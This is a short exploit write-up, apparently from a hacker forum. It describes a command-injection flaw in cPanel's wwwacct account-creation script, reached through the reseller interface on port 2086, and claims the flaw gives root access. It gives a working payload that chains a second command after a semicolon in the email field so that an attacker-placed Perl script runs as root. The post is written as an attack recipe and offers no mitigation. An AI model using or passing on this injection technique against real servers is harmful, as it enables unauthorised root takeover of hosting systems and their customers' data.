Version : ALL !!
Risk : Very high
What u can do with this bug is :
u can have a access to all the server with reseller privilege (Th3 r00t)
how it's work ?
when u want to create an account in shell what will happen ?
./script/wwwact [domainname] [username] [password] [Email address] lab lab lab
that u can run it with a web base program ! ( cpanel : doamin:2086)
example :
http://domain:2086/scripts/wwwacct  [domainname] [username] [password] [Email address] lab lab lab
it means you got a access to wwwacct in the scripts folder (Th3 r00t)
so u can run other command with root access like that
./scripts/wwwactt domain.com domain password ali@hackerz.ir;./home/hackerz/public_html/do.pl ( your command now is ./home/hackerz/public_html/do.pl)
that u can Likewise run it on  the web base program.what u need to do is just write ali@hackerz.ir;./home/hackerz/public_html/do.pl in Email text box when u want to create an account.
